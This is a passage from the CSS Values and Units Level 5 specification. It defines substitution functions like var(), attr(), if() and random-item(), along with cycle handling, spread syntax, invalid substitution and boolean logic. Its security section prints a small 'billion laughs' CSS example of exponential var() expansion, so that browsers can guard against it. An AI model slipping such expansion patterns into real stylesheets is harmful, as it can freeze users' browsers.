  [Replace an arbitrary substitution function](#replace-an-arbitrary-substitution-function) for *func*, given *arguments*, as defined by that function. Let *result* be the returned list of [component values](css-syntax-3.md#component-value).
  5.
  If *result* contains the guaranteed-invalid value, replace *func* in *values* with the guaranteed-invalid value. Otherwise, replace *func* in *values* with *result*.
3.
If *context* is marked as a [cyclic substitution context](#cyclic-substitution-contexts), return the guaranteed-invalid value. Nested [arbitrary substitution functions](#arbitrary-substitution-function) may have marked *context* as [cyclic](#cyclic-substitution-contexts) in step 2.
4.
Return *values*.

A *<a id="substitution-context"></a>substitution context* is a list consisting of: the dependency type, as a string; one or more additional values, specific to the dependency type. (Usually, just one additional string.)

As [arbitrary substitution functions](#arbitrary-substitution-function) are resolved they accumulate [substitution contexts](#substitution-context) which affect how *nested* arbitrary substitution functions resolve.

<a id="example-598159b1"></a> For example, while resolving a var(--foo) function, the value of the --foo property is fetched and [substituted](#substitute-arbitrary-substitution-function), with a [substitution context](#substitution-context) of `«"property", "--foo"»`, preventing any nested [arbitrary substitution functions](#arbitrary-substitution-function) from cyclicly depending on --foo as well.

While resolving an attr(foo) function, the value of the foo attribute on the element is fetched and [substituted](#substitute-arbitrary-substitution-function), with a [substitution context](#substitution-context) of `«"attribute", "foo"»`, preventing any nested functions from cyclicly depending on the foo attribute as well.

The types of [substitution contexts](#substitution-context) are currently:

-
"property", followed by a property name, and optionally a custom function.
-
"attribute", followed by an attribute name.
-
"function", followed by a custom function.

As [substitution](#substitute-arbitrary-substitution-function) is recursively invoked by nested [arbitrary substitution functions](#arbitrary-substitution-function) being [replaced](#replace-an-arbitrary-substitution-function), [guards](#guarded) "stack up" the [substitution contexts](#substitution-context) passed to each invocation.

When a [substitution context](#substitution-context) is *<a id="guarded"></a>guarded*, it means that, for the duration of the guard, an attempt to guard a matching substitution context again will mark all substitution contexts involved in the cycle as *<a id="cyclic-substitution-contexts"></a>cyclic substitution contexts*.

<a id="example-db049997"></a> For example, given the following style:

```
.foo {
  --one: var(--two);
  --two: var(--one);
}
```

[Property replacement](#property-replacement) for --one invokes [substitution](#substitute-arbitrary-substitution-function) with a [substitution context](#substitution-context) of «"property", "--one"». Substitution sees the var(--two) function and invokes [replace a var() function](#replace-an-arbitrary-substitution-function), which fetches the values of --two and substitutes again, this time with a substitution context of «"property", "--two"». That substitution sees the var(--one) function and invokes replace a var() function, which fetches the value of --one and substitutes again, with a substitution context of «"property", "--one"».

This, finally, is a [cyclic substitution context](#cyclic-substitution-contexts), since it matches the [substitution context](#substitution-context) from the first [substitution](#substitute-arbitrary-substitution-function), causing the substitution to just produce the guaranteed-invalid value. This percolates back up the nested invocations, eventually resulting in --one becoming [invalid at computed-value time](#invalid-at-computed-value-time). The same happens, in opposite order, when performing [property replacement](#property-replacement) on --two.

<a id="example-e48a0f6b"></a> When a [cycle is detected](#cyclic-substitution-contexts), all participants in the cycle become invalid. For example, all of the following declarations become [invalid at computed-value time](#invalid-at-computed-value-time).

```
.foo {
  --one: var(--two);
  --two: var(--three, baz);
  --three: var(--one);
}
```

The presence of a fallback in `var(--three, baz)` does not affect the outcome.

### <a id="early-resolution"></a> Argument Grammars and Spread Syntax

Each [arbitrary substitution function](#arbitrary-substitution-function), in addition to its standard grammar, must define an *<a id="argument-grammar"></a>argument grammar*: a much less specific and less restrictive version of its normal grammar, which serves solely to separate the function’s contents into distinct arguments.

Note: Typically, an [argument grammar](#argument-grammar) will only consist of some punctuation (usually commas) and the [<declaration-value>](css-syntax-3.md#typedef-declaration-value) production. See the [if()](#funcdef-if) function for an example.

Each function, in its [replacement](#replace-an-arbitrary-substitution-function) algorithm, will apply [substitution](#substitute-arbitrary-substitution-function) to its arguments and then [parse](css-syntax-3.md#css-parse-something-according-to-a-css-grammar) them according to the appropriate parts of its standard grammar. As it is in control of this process, however, some arguments can be left unresolved and unparsed.

<a id="example-eeb64de1"></a> For example, the [if()](#funcdef-if) function’s [argument grammar](#argument-grammar) merely divides its value into alternating "test" and "result" arguments, separated by `:` and `;`. It then evaluates tests one by one, and only evaluates a single argument matching the first successful test.

This allows [if()](#funcdef-if) to achieve behavior similar to `if` constructs in other programming languages, where later "branches" aren’t evaluated at all (beyond a basic parse) and thus can’t cause errors in cases that would be caught by earlier branches.

This means the following is a valid declaration when the viewport is 600px or wider, resulting in the value [blue](css-color-4.md#valdef-color-blue). Only when the viewport is narrower than 600px does the [if()](#funcdef-if) trigger cyclic behavior and cause --color to be [invalid at computed-value time](#invalid-at-computed-value-time).

```
.foo {
  --color: if(media(width >= 600px): blue; else: var(--color));
}
```

This also means that, ordinarily, parsing according to a function’s [argument grammar](#argument-grammar) *does not* see the results of any nested [arbitrary substitution functions](#arbitrary-substitution-function); the contents are divided into arguments based only on the values literally present inside the function.

<a id="example-af866466"></a> For example, in random-item(auto, var(--foo), var(--bar)), the [random-item()](#funcdef-random-item) function selects between two random values, either the result of var(--foo) or var(--bar). This is true even if one of them contains commas, like:

```
.random-fonts {
  --foo: Courier, monospace;
  --bar: Arial, serif;
  font-family: random-item(auto, var(--foo), var(--bar));
  /* equivalent to: */
  font-family: random-item(auto, {Courier, monospace}, {Arial, serif});

  /* and thus, randomly, equivalent to either */
  font-family: Courier, monospace;
  /* or */
  font-family: Arial, serif;
}
```

This behavior ensures that authors don’t have to defensively wrap any arguments containing [arbitrary substitution functions](#arbitrary-substitution-function) in {} characters; what you see is what you get.

Note: This is different from the behavior of [arbitrary substitution functions](#arbitrary-substitution-function) substituted into "normal" functions or properties. For example, --colors: red, blue, green; background: linear-gradient(var(--colors)); works in the expected fashion, producing a gradient with three color stops, because normal functions don’t do this separate [argument grammar](#argument-grammar) parse.

This behavior can be worked around by immediately preceding an [arbitrary substitution function](#arbitrary-substitution-function) with the *<a id="spread-syntax"></a>spread syntax* ..., indicating that it must be resolved "early", before division into arguments.

<a id="example-20069a0e"></a> For example, the following **will not work**:

```
.invalid-if {
  --if-clause: media(width >= 600px): blue;
  color: if(var(--if-clause); else: green;);
}
```

The [if()](#funcdef-if) function entirely fails to parse according to its [argument grammar](#argument-grammar): there’s no `:` character separating the test from the value in the first branch.

To get the desired behavior of "spreading" the variable into the function’s arguments, use ...':

```
.valid-if {
  --if-clause: media(width >= 600px): blue;
  color: if(...var(--if-clause); else: green;);
}
```

The [spread syntax](#spread-syntax) is three distinct [<delim-token>](css-syntax-3.md#typedef-delim-token)s with the value `"."`, all of which must not contain any whitespace between them, or between the group and the subsequent [arbitrary substitution function](#arbitrary-substitution-function).

<a id="example-6f229e26"></a> That is, ...var(--foo) is a valid use of the [spread syntax](#spread-syntax), but ... var(--foo) is not, nor is . . .var(--foo).

The latter usages will result in the [arbitrary substitution function](#arbitrary-substitution-function) being evaluated at the normal time, *after* the [argument grammar](#argument-grammar) has been applied, and the period characters being part of the function’s value.

Note: The [spread syntax](#spread-syntax) is only used *within* an [arbitrary substitution function’s](#arbitrary-substitution-function) value, as it’s only referenced by the [substitution](#substitute-arbitrary-substitution-function) algorithm when parsing an arbitrary substitution function. Using it outside of that, such as in width: ...var(--sidebar-width);, is not recognized as an early invocation; instead, the periods are just part of the property’s value, unrelated to the var() function, and would in this case make the width property invalid. (This is similar to JavaScript, where this syntax was borrowed from, where `[1, ...arr, 5]` is valid, but `var x = ...arr;` is not.)

To *<a id="substitute-early-invoked-functions"></a>substitute early-invoked functions* in a sequence of [component values](css-syntax-3.md#component-value) *values*:

1.
For each [arbitrary substitution function](#arbitrary-substitution-function) *func* in *values* (ordered via a depth-first pre-order traversal) using the [spread syntax](#spread-syntax) that is not nested in the contents of another arbitrary substitution function:
  1.
  [Substitute early-invoked functions](#substitute-early-invoked-functions) in *func*’s contents, and let *early result* be the result.
  2.
  If *early result* contains the guaranteed-invalid value, replace *func* in *values* with the guaranteed-invalid value and continue.
  3.
  [Parse](css-syntax-3.md#css-parse-something-according-to-a-css-grammar) *early result* acccording to *func*’s [argument grammar](#argument-grammar). If this returns failure, replace *func* in values with the guaranteed-invalid value and continue; otherwise, let *arguments* be the result.
  4.
  [Replace an arbitrary substitution function](#replace-an-arbitrary-substitution-function) for *func*, given *arguments*, as defined by that function. Let *result* be the returned list of [component values](css-syntax-3.md#component-value).
  5.
  If *result* contains the guaranteed-invalid value, replace *func* in *values* with the guaranteed-invalid value. Otherwise, replace *func* in *values* with *result*.
2.
Return *values*.

### <a id="resolve-property"></a> Resolving in Properties

Unless otherwise specified, [arbitrary substitution functions](#arbitrary-substitution-function) can be used in place of any part of any property’s value (including within other [functional notations](css-values-4.md#functional-notation)); and are not valid in any other context.

<a id="issue-2cf4bbb3"></a> Should any of these functions be valid in contexts outside of properties?

<a id="example-43a8c543"></a> For example, the following code incorrectly attempts to use a variable as a property name:

```
.foo {
  --side: margin-top;
  var(--side): 20px;
}
```

This is *not* equivalent to setting [margin-top: 20px;](css-box-4.md#propdef-margin-top). Instead, the second declaration is simply thrown away as a syntax error for having an invalid property name.

If a property value contains one or more [arbitrary substitution functions](#arbitrary-substitution-function), and all of those functions are themselves syntactically valid according to their [argument grammar](#argument-grammar)s, the entire value’s grammar must be assumed to be valid at parse time.

[Arbitrary substitution functions](#arbitrary-substitution-function) are [substituted](#substitute-arbitrary-substitution-function) during style [computation](css-cascade-5.md#computed-value), before any other value transformations or introspection can occur. If a property, after [property replacement](#property-replacement), does not match its declared grammar, the declaration is [invalid at computed-value time](#invalid-at-computed-value-time).

Note: Since [arbitrary substitution functions](#arbitrary-substitution-function) resolve at [computed value](css-cascade-5.md#computed-value) time, if the resulting value after substitution is invalid, the property falls back (essentially) to [unset](css-cascade-5.md#valdef-all-unset) behavior, rather than falling back to an earlier value in the cascade the way declarations invalid at parse time do. See [Invalid Substitution](#invalid-substitution).

If a property value, after [property replacement](#property-replacement), contains only a single [CSS-wide keyword](css-values-4.md#css-wide-keywords) (and possibly whitespace/comments), its value is determined as if that keyword were its [specified value](css-cascade-5.md#specified-value) all along.

<a id="example-b87fa983"></a> For example, the following usage is fine from a syntax standpoint, but results in nonsense when the variable is substituted in:

```
:root { --looks-valid: 20px; }
p { background-color: var(--looks-valid); }
```

Since 20px is an invalid value for [background-color](css-backgrounds-3.md#propdef-background-color), the property becomes [invalid at computed-value time](#invalid-at-computed-value-time), and instead resolves to [transparent](css-color-4.md#valdef-color-transparent) (the [initial value](css-cascade-5.md#initial-value) for background-color).

If the property was one that’s inherited by default, such as [color](css-color-4.md#propdef-color), it would compute to the inherited value rather than the initial value.

<a id="example-7afce32e"></a> While a var() function can’t get a [CSS-wide keyword](css-values-4.md#css-wide-keywords) from the custom property itself—​if you tried to specify that, like --foo: initial;, it would just trigger explicit defaulting for the custom property—​it can have a CSS-wide keyword in its fallback:

```
p { color: var(--does-not-exist, initial); }
```

In the above code, if the --does-not-exist property didn’t exist or is [invalid at computed-value time](#invalid-at-computed-value-time), the var() will instead substitute in the [initial](css-cascade-5.md#valdef-all-initial) keyword, making the property behave as if it was originally [color: initial](css-color-4.md#propdef-color). This will make it take on the document’s initial color value, rather than defaulting to inheritance, as it would if there were no fallback.

To *<a id="property-replacement"></a>replace substitution functions in a property* *prop*:

1.
[Substitute arbitrary substitution functions](#substitute-arbitrary-substitution-function) in *prop*’s value, given «"property", *prop*’s name» as the [substitution context](#substitution-context). Let *result* be the returned [component value](css-syntax-3.md#component-value) sequence.
2.
If *result* contains the guaranteed-invalid value, *prop* is [invalid at computed-value time](#invalid-at-computed-value-time); return.
3.
[Parse](css-syntax-3.md#css-parse-something-according-to-a-css-grammar) *result* according to *prop*’s grammar. If this returns failure, *prop* is [invalid at computed-value time](#invalid-at-computed-value-time); return.
4.
Otherwise, replace *prop*’s value with the parsed result.

Note that [substitution](#substitute-arbitrary-substitution-function) takes place at the level of CSS tokens [[css-syntax-3]](#biblio-css-syntax-3), not at a textual level; you can’t build up a single token where part of it is provided by a variable:

```
.foo {
  --gap: 20;
  margin-top: var(--gap)px;
}
```

This is *not* equivalent to setting [margin-top: 20px;](css-box-4.md#propdef-margin-top) (a length). Instead, it’s equivalent to margin-top: 20 px; (a number followed by an ident), which is simply an invalid value for the margin-top property. Note, though, that [calc()](css-values-4.md#funcdef-calc) can be used to validly achieve the same thing, like so:

```
.foo {
  --gap: 20;
  margin-top: calc(var(--gap) * 1px);
}
```

This also implies that the post-substitution value might not be directly serializable as-is. Here’s a similar example to the preceding:

```
.foo {
  --gap: 20;
  --not-px-length: var(--gap)px;
}
```

The serialization of the computed (post-substitution) value of --not-px-length is **not** 20px, because that would parse back as the single combined dimension; instead, it will serialize with a comment between the two tokens, like px, to enforce that they are separate tokens even when re-parsing.

### <a id="invalid-substitution"></a><a id="invalid-variables"></a> Invalid Substitution

When [property replacement](#property-replacement) results in a property’s value containing the guaranteed-invalid value, this makes the declaration *<a id="invalid-at-computed-value-time"></a>invalid at computed-value time*. When this happens, the computed value is one of the following depending on the property’s type:

**The property is a non-registered custom property **
**The property is a registered custom property with universal syntax **
:

The computed value is the guaranteed-invalid value.

**Otherwise **
:

Either the property’s inherited value or its initial value depending on whether the property is inherited or not, respectively, as if the property’s value had been specified as the [unset](css-cascade-5.md#valdef-all-unset) keyword.

<a id="example-53e4f9d5"></a> For example, in the following code:

```
:root { --not-a-color: 20px; }
p { background-color: red; }
p { background-color: var(--not-a-color); }
```

the <p> elements will have transparent backgrounds (the initial value for [background-color](css-backgrounds-3.md#propdef-background-color)), rather than red backgrounds. The same would happen if the custom property itself was unset, or contained an invalid var() function.

Note the difference between this and what happens if the author had just written [background-color: 20px](css-backgrounds-3.md#propdef-background-color) directly in their stylesheet - that would be a normal syntax error, which would cause the rule to be discarded, so the background-color: red rule would be used instead.

Note: The [invalid at computed-value time](#invalid-at-computed-value-time) concept exists because [arbitrary substitution functions](#arbitrary-substitution-function) can’t "fail early" like other syntax errors can, so by the time the user agent realizes a property value is invalid, it’s already thrown away the other cascaded values.

### <a id="substitution-in-shorthands"></a><a id="variables-in-shorthands"></a> Substitution in Shorthand Properties

[Arbitrary substitution functions](#arbitrary-substitution-function) produce some complications when parsing [shorthand properties](css-cascade-5.md#shorthand-property) into their component longhands, and when serializing shorthand properties *from* their component longhands.

If a [shorthand property](css-cascade-5.md#shorthand-property) contains an [arbitrary substitution function](#arbitrary-substitution-function) in its value, the [longhand properties](css-cascade-5.md#longhand) it’s associated with must instead be filled in with a special, unobservable-to-authors *<a id="pending-substitution-value"></a>pending-substitution value* that indicates the shorthand contains an arbitrary substitution function, and thus the longhand’s value can’t be determined until after [substituted](#substitute-arbitrary-substitution-function).

This value must then be cascaded as normal, and at computed-value time, after [substitution](#substitute-arbitrary-substitution-function), the shorthand must be parsed and the longhands must be given their appropriate values at that point.

Note: When a shorthand is written without an [arbitrary substitution function](#arbitrary-substitution-function), it is parsed and separated out into its component [longhand properties](css-cascade-5.md#longhand) at parse time; the longhands then participate in the cascade, with the [shorthand property](css-cascade-5.md#shorthand-property) more or less discarded. When the shorthand contains a var(), however, this can’t be done, as the var() could be substituted with anything.

[Pending-substitution values](#pending-substitution-value) must be serialized as the empty string, if an API allows them to be observed.

[Shorthand properties](css-cascade-5.md#shorthand-property) are serialized by gathering the values of their component [longhand properties](css-cascade-5.md#longhand), and synthesizing a value that will parse into the same set of values.

If all of the component [longhand properties](css-cascade-5.md#longhand) for a given [shorthand](css-cascade-5.md#shorthand-property) are [pending-substitution values](#pending-substitution-value) from the same original shorthand value, the shorthand property must serialize to that original ([arbitrary substitution function](#arbitrary-substitution-function)-containing) value.

Otherwise, if any of the component [longhand properties](css-cascade-5.md#longhand) for a given [shorthand](css-cascade-5.md#shorthand-property) are [pending-substitution values](#pending-substitution-value), or contain [arbitrary substitution functions](#arbitrary-substitution-function) of their own that have not yet been [substituted](#substitute-arbitrary-substitution-function), the shorthand property must serialize to the empty string.

### <a id="long-substitution"></a><a id="long-variables"></a> Safely Handling Overly-Long Substitution

Naively implemented, some [arbitrary substitution functions](#arbitrary-substitution-function) (such as var()) can be used in a variation of the "billion laughs attack":

<a id="example-9c9258de"></a>

```
.foo {
  --prop1: lol;
  --prop2: var(--prop1) var(--prop1);
  --prop3: var(--prop2) var(--prop2);
  --prop4: var(--prop3) var(--prop3);
  /* etc */
}
```

In this short example, --prop4’s computed value is lol lol lol lol lol lol lol lol, containing 8 copies of the original lol. Every additional level added to this doubles the number of identifiers; extending it to a mere 30 levels, the work of a few minutes by hand, would make --prop30 contain *nearly a billion instances* of the identifier.

To avoid this sort of attack, UAs must impose a UA-defined limit on the allowed length of the token stream that an [arbitrary substitution function](#arbitrary-substitution-function) expands into. If an arbitrary substitution function would expand into a longer token stream than this limit, it instead is replaced with the guaranteed-invalid value.

This specification does not define what size limit should be imposed. However, since there are valid use-cases for custom properties that contain a kilobyte or more of text, it’s recommended that the limit be set relatively high.

Note: The general principle that UAs are allowed to violate standards due to resource constraints is still generally true here; a UA might, separately, have limits on how long of a custom property they can support, or how large of an identifier they can support. This section calls out this attack specifically because of its long history, and the fact that it can be done without any of the pieces *seeming* to be too large on first inspection.

## <a id="boolean-logic"></a> Appendix B: Boolean Logic

In order to accommodate future extensions of CSS, [<boolean-expr[]>](#typedef-boolean-expr) productions generally interpret their <general-enclosed> grammar branch as unknown, and their boolean logic is resolved using 3-value Kleene logic. In some cases (such as @supports), <general-enclosed> is instead defined as false; in which case the logic devolves to standard boolean algebra.

3-value boolean logic is applied recursively to a boolean condition *test* as follows:

-
A leaf-level *test* resolves to true, false, or unknown, as defined by the relevant specification.
-
not *test* evaluates to true if its contained *test* is false, false if it’s true, and unknown if it’s unknown.
-
Multiple *test*s connected with and evaluate to true if *all* of those *test*s are true, false if *any* of them are false, and unknown otherwise (i.e. if at least one unknown, but no false).
-
Multiple *test*s connected with or evaluate to true if *any* of those *test*s are true, false if *all* of them are false, and unknown otherwise (i.e. at least one unknown, but no true).

If a “top-level” [<boolean-expr[]>](#typedef-boolean-expr) is unknown, and the containing context doesn’t otherwise define how to handle unknown conditions, it evaluates to false.

Note: That is, unknown doesn’t “escape” a 3-value boolean expression unless explicitly handled, similar to how `NaN` doesn’t “escape” a [top-level calculation](css-values-4.md#top-level-calculation)).

## <a id="acknowledgments"></a> Acknowledgments

Firstly, the editors would like to thank all of the contributors to the [previous level](css-values-4.md#acknowledgments) of this module.

Secondly, we would like to acknowledge Guillaume Lebas, L. David Baron, Mike Bremford, Sebastian Zartner, and especially Scott Kellum for their ideas, comments, and suggestions for Level 5;

## <a id="changes"></a> Changes

### <a id="changes-recent"></a> Recent Changes

Changes since the 11 November 2024 Working Draft:

-
Dropped media-progess() and [container-progress()](#funcdef-container-progress) in favor of using relevant units in [progress()](#funcdef-progress). (Issue 11826)

See also earlier changes.

### <a id="additions-L4"></a> Additions Since Level 4

Additions since [CSS Values and Units Level 4](css-values-4.md):

-
Added the “comma-wrapping” {} notation for function arguments.
-
Defined several [<url-modifier>](css-values-4.md#typedef-url-modifier)s for [<url>](css-values-4.md#url-value) functions.
-
Extended [<position>](#typedef-position) to handle flow-relative positions. (Issue 549)
-
Added the [*-progress()](#progress) family of functions, to represent interpolation progress between two values.
-
Added the [*-mix()](#mixing) family of functions, to represent actually interpolating between two values.
-
Added [first-valid()](#funcdef-first-valid), to allow CSS’s forward-compatible parsing behavior (drop invalid things, go with what’s left) to be used with custom properties and other contexts where validity isn’t known until *after* parsing.
-
Added [if()](#funcdef-if) for inline conditionals.
-
Added [inherit()](#funcdef-inherit).
-
Added the [cycle()](#funcdef-cycle) and [attr()](#funcdef-attr) functions.
-
Added the [random()](#funcdef-random) and [random-item()](#funcdef-random-item) functions.
-
Added the [sibling-count()](#funcdef-sibling-count) and [sibling-index()](#funcdef-sibling-index) functions.
-
Added the [calc-size()](#funcdef-calc-size) function, and the related [interpolate-size](#propdef-interpolate-size) property.
-
Added the [<boolean-expr[]>](#typedef-boolean-expr) syntax notation to the [value definition syntax](css-values-4.md#css-value-definition-syntax).

## <a id="security"></a> Security Considerations

This specification allows CSS [<url>](css-values-4.md#url-value) values to have various aspects of their request modified. Although this is new to CSS, every ability is already present in `img` or `link`, as well as via JavaScript.

The [attr()](#funcdef-attr) function allows HTML attribute values to be used in CSS values, potentially exposing sensitive information that was previously not accessible via CSS. See [§ 8.7.2 Security](#attr-security).

## <a id="privacy"></a> Privacy Considerations

This specification defines units that expose the user’s screen size and default font size, but both are trivially observable from JS, so they do not constitute a new privacy risk. Similarly the [media-progress()](#funcdef-media-progress) notation exposes information about the user’s environment and preferences that are already observiable via media queries.

The [attr()](#funcdef-attr) function allows HTML attribute values to be used in CSS values, potentially exposing sensitive information that was previously not accessible via CSS. See [§ 8.7.2 Security](#attr-security).

## <a id="references"></a>References

### <a id="normative"></a>Normative References

**<a id="biblio-css-align-3"></a>[CSS-ALIGN-3] **
: Elika Etemad; Tab Atkins Jr.. CSS Box Alignment Module Level 3. URL: https://drafts.csswg.org/css-align/
**<a id="biblio-css-animations-1"></a>[CSS-ANIMATIONS-1] **
: David Baron; et al. CSS Animations Level 1. URL: https://drafts.csswg.org/css-animations/
**<a id="biblio-css-animations-2"></a>[CSS-ANIMATIONS-2] **
: David Baron; Brian Birtles. CSS Animations Level 2. URL: https://drafts.csswg.org/css-animations-2/
**<a id="biblio-css-backgrounds-3"></a>[CSS-BACKGROUNDS-3] **
: Elika Etemad; Brad Kemper. [CSS Backgrounds and Borders Module Level 3](css-backgrounds-3.md). URL: [https://drafts.csswg.org/css-backgrounds/](css-backgrounds-3.md)
**<a id="biblio-css-cascade-5"></a>[CSS-CASCADE-5] **
: Elika Etemad; Miriam Suzanne; Tab Atkins Jr.. [CSS Cascading and Inheritance Level 5](css-cascade-5.md). URL: [https://drafts.csswg.org/css-cascade-5/](css-cascade-5.md)
**<a id="biblio-css-cascade-6"></a>[CSS-CASCADE-6] **
: Elika Etemad; Miriam Suzanne; Tab Atkins Jr.. CSS Cascading and Inheritance Level 6. URL: https://drafts.csswg.org/css-cascade-6/
**<a id="biblio-css-color-5"></a>[CSS-COLOR-5] **
: Chris Lilley; Una Kravets; Lea Verou. CSS Color Module Level 5. URL: https://drafts.csswg.org/css-color-5/
**<a id="biblio-css-conditional-3"></a>[CSS-CONDITIONAL-3] **
: Chris Lilley; David Baron; Elika Etemad. CSS Conditional Rules Module Level 3. URL: https://drafts.csswg.org/css-conditional-3/
**<a id="biblio-css-conditional-5"></a>[CSS-CONDITIONAL-5] **
: Chris Lilley; et al. CSS Conditional Rules Module Level 5. URL: https://drafts.csswg.org/css-conditional-5/
**<a id="biblio-css-display-3"></a>[CSS-DISPLAY-3] **
: Tab Atkins Jr.; Elika Etemad. CSS Display Module Level 3. URL: https://drafts.csswg.org/css-display/
**<a id="biblio-css-easing-2"></a>[CSS-EASING-2] **
: CSS Easing Functions Level 2. URL: https://drafts.csswg.org/css-easing/
**<a id="biblio-css-fonts-4"></a>[CSS-FONTS-4] **
: Chris Lilley. CSS Fonts Module Level 4. URL: https://drafts.csswg.org/css-fonts-4/
**<a id="biblio-css-images-3"></a>[CSS-IMAGES-3] **
: Tab Atkins Jr.; Elika Etemad; Lea Verou. [CSS Images Module Level 3](css-images-3.md). URL: [https://drafts.csswg.org/css-images-3/](css-images-3.md)
**<a id="biblio-css-images-4"></a>[CSS-IMAGES-4] **
: Elika Etemad; Tab Atkins Jr.; Lea Verou. CSS Images Module Level 4. URL: https://drafts.csswg.org/css-images-4/
**<a id="biblio-css-mixins-1"></a>[CSS-MIXINS-1] **
: Tab Atkins Jr.; Miriam Suzanne. CSS Functions and Mixins Module. URL: https://drafts.csswg.org/css-mixins/
**<a id="biblio-css-properties-values-api-1"></a>[CSS-PROPERTIES-VALUES-API-1] **
: Tab Atkins Jr.; Alan Stearns; Greg Whitworth. CSS Properties and Values API Level 1. URL: https://drafts.css-houdini.org/css-properties-values-api-1/
**<a id="biblio-css-pseudo-4"></a>[CSS-PSEUDO-4] **
: Elika Etemad; Alan Stearns. CSS Pseudo-Elements Module Level 4. URL: https://drafts.csswg.org/css-pseudo-4/
**<a id="biblio-css-shadow-1"></a>[CSS-SHADOW-1] **
: CSS Shadow Module Level 1. Editor's Draft. URL: https://drafts.csswg.org/css-shadow-1/
**<a id="biblio-css-sizing-3"></a>[CSS-SIZING-3] **
: Tab Atkins Jr.; Elika Etemad. CSS Box Sizing Module Level 3. URL: https://drafts.csswg.org/css-sizing-3/
**<a id="biblio-css-sizing-4"></a>[CSS-SIZING-4] **
: Tab Atkins Jr.; Elika Etemad; Jen Simmons. CSS Box Sizing Module Level 4. URL: https://drafts.csswg.org/css-sizing-4/
**<a id="biblio-css-syntax-3"></a>[CSS-SYNTAX-3] **
: Tab Atkins Jr.; Simon Sapin. [CSS Syntax Module Level 3](css-syntax-3.md). URL: [https://drafts.csswg.org/css-syntax/](css-syntax-3.md)
**<a id="biblio-css-transforms-1"></a>[CSS-TRANSFORMS-1] **
: Simon Fraser; et al. [CSS Transforms Module Level 1](css-transforms-1.md). URL: [https://drafts.csswg.org/css-transforms/](css-transforms-1.md)
**<a id="biblio-css-transforms-2"></a>[CSS-TRANSFORMS-2] **
: Tab Atkins Jr.; et al. [CSS Transforms Module Level 2](css-transforms-2.md). URL: [https://drafts.csswg.org/css-transforms-2/](css-transforms-2.md)
**<a id="biblio-css-transitions-1"></a>[CSS-TRANSITIONS-1] **
: Chris Marrin; et al. CSS Transitions Module Level 1. URL: https://drafts.csswg.org/css-transitions/
**<a id="biblio-css-typed-om-1"></a>[CSS-TYPED-OM-1] **
: Tab Atkins Jr.; François Remy. CSS Typed OM Level 1. URL: https://drafts.css-houdini.org/css-typed-om-1/
**<a id="biblio-css-values-4"></a>[CSS-VALUES-4] **
: Tab Atkins Jr.; Elika Etemad. [CSS Values and Units Module Level 4](css-values-4.md). URL: [https://drafts.csswg.org/css-values-4/](css-values-4.md)
**<a id="biblio-css-values-5"></a>[CSS-VALUES-5] **
: Tab Atkins Jr.; Elika Etemad; Miriam Suzanne. CSS Values and Units Module Level 5. URL: https://drafts.csswg.org/css-values-5/
**<a id="biblio-css-variables-2"></a>[CSS-VARIABLES-2] **
: CSS Custom Properties for Cascading Variables Module Level 2. Editor's Draft. URL: https://drafts.csswg.org/css-variables-2/
**<a id="biblio-css-writing-modes-4"></a>[CSS-WRITING-MODES-4] **
: Elika Etemad; Koji Ishii. CSS Writing Modes Level 4. URL: https://drafts.csswg.org/css-writing-modes-4/
**<a id="biblio-css21"></a>[CSS21] **
: Bert Bos; et al. Cascading Style Sheets Level 2 Revision 1 (CSS 2.1) Specification. URL: https://drafts.csswg.org/css2/
**<a id="biblio-cssom-1"></a>[CSSOM-1] **
: Daniel Glazman; Emilio Cobos Álvarez. CSS Object Model (CSSOM). URL: https://drafts.csswg.org/cssom/
**<a id="biblio-dom"></a>[DOM] **
: Anne van Kesteren. DOM Standard. Living Standard. URL: https://dom.spec.whatwg.org/
**<a id="biblio-fetch"></a>[FETCH] **
: Anne van Kesteren. Fetch Standard. Living Standard. URL: https://fetch.spec.whatwg.org/
**<a id="biblio-html"></a>[HTML] **
: Anne van Kesteren; et al. HTML Standard. Living Standard. URL: https://html.spec.whatwg.org/multipage/
**<a id="biblio-infra"></a>[INFRA] **
: Anne van Kesteren; Domenic Denicola. Infra Standard. Living Standard. URL: https://infra.spec.whatwg.org/
**<a id="biblio-mediaqueries-5"></a>[MEDIAQUERIES-5] **
: Tab Atkins Jr.; et al. Media Queries Level 5. URL: https://drafts.csswg.org/mediaqueries-5/
**<a id="biblio-referrer-policy"></a>[REFERRER-POLICY] **
: Jochen Eisinger; Emily Stark. Referrer Policy. URL: https://w3c.github.io/webappsec-referrer-policy/
**<a id="biblio-rfc2119"></a>[RFC2119] **
: S. Bradner. Key words for use in RFCs to Indicate Requirement Levels. March 1997. Best Current Practice. URL: https://datatracker.ietf.org/doc/html/rfc2119
**<a id="biblio-selectors-3"></a>[SELECTORS-3] **
: Tantek Çelik; et al. Selectors Level 3. URL: https://drafts.csswg.org/selectors-3/
**<a id="biblio-selectors-4"></a>[SELECTORS-4] **
: Elika Etemad; Tab Atkins Jr.. [Selectors Level 4](selectors-4.md). URL: [https://drafts.csswg.org/selectors/](selectors-4.md)
**<a id="biblio-web-animations-1"></a>[WEB-ANIMATIONS-1] **
: Brian Birtles; et al. Web Animations. URL: https://drafts.csswg.org/web-animations-1/
**<a id="biblio-web-animations-2"></a>[WEB-ANIMATIONS-2] **
: Brian Birtles; Robert Flack. Web Animations Module Level 2. URL: https://drafts.csswg.org/web-animations-2/
**<a id="biblio-webidl"></a>[WEBIDL] **
: Edgar Chen; Timothy Gu. Web IDL Standard. Living Standard. URL: https://webidl.spec.whatwg.org/
### <a id="informative"></a>Non-Normative References

**<a id="biblio-css-box-4"></a>[CSS-BOX-4] **
: Elika Etemad. [CSS Box Model Module Level 4](css-box-4.md). URL: [https://drafts.csswg.org/css-box-4/](css-box-4.md)
**<a id="biblio-css-cascade-4"></a>[CSS-CASCADE-4] **
: Elika Etemad; Tab Atkins Jr.. CSS Cascading and Inheritance Level 4. URL: https://drafts.csswg.org/css-cascade-4/
**<a id="biblio-css-color-4"></a>[CSS-COLOR-4] **
: Tab Atkins Jr.; Chris Lilley; Lea Verou. [CSS Color Module Level 4](css-color-4.md). URL: [https://drafts.csswg.org/css-color-4/](css-color-4.md)
**<a id="biblio-css-display-4"></a>[CSS-DISPLAY-4] **
: Elika Etemad; Tab Atkins Jr.. CSS Display Module Level 4. URL: https://drafts.csswg.org/css-display-4/
**<a id="biblio-css-lists-3"></a>[CSS-LISTS-3] **
: Elika Etemad; Tab Atkins Jr.. CSS Lists and Counters Module Level 3. URL: https://drafts.csswg.org/css-lists-3/
**<a id="biblio-css-variables"></a>[CSS-VARIABLES] **
